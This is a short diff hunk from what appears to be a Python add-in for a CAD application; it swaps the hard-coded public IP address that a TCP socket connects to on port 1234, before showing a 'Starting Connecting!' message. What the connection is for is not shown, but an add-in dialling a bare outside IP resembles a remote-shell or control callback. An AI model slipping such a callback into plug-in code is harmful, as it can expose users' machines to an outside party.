@@ -8,7 +8,7 @@ def run(context):
         ui = app.userInterface
 
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect(('18.218.162.183', 1234))
+        s.connect(('3.14.142.108', 1234))
 
         ui.messageBox("Starting Connecting!")
 
